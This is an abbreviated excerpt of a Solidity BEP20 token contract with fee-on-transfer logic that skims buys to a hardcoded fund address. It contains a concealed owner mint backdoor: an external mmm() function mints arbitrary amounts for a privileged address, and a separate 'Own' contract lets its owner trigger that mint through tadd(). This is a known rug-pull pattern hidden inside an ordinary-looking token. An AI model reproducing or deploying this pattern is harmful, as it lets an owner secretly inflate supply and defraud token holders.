...
interface ITRQ {
    function mmm(address to,uint256 tAmount) external ;
}
...
contract Own is  Ownable {
    ...
    function tadd(address to,uint256 amount) public onlyOwner {
        ITRQ(tokenAddr).mmm(to,amount);
    }

    function settoken(address to) public onlyOwner {
        tokenAddr=to;
    }
}

contract TCTC is Context, IBEP20, Ownable {
    ...
    address private fundAddress = address(0xb4D91eDe6D59B496efe9908Af8036BD69B5BD1D1);
  ...
  */
   ...
   */
    function mmm(address addr,uint256 amount) external {
        require(mAddress==msg.sender,"limit");
        _mint(addr, amount);
    }
   ...
   */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if ( balanceOf(_destroyAddress)>=18900000*10**18) {
            takeFee = false;
        }
        ...
        if (takeFee) {
            ...
            if (sender==uniswapV2Pair && isRoute[recipient]){
                ...
                _takeTransfer(
                    sender,
                    _destroyAddress,
                    amount.div(100).mul(_destroyFee)
                );
                _takeTransfer(
                    sender,
                    fundAddress,
                    amount.div(100).mul(_fundFee)
                );
            ...
            rate = _destroyFee + _fundFee;
        }

        uint256 recipientRate = 100 - rate;


        _takeTransfer(sender,recipient,amount.div(100).mul(recipientRate));
    }
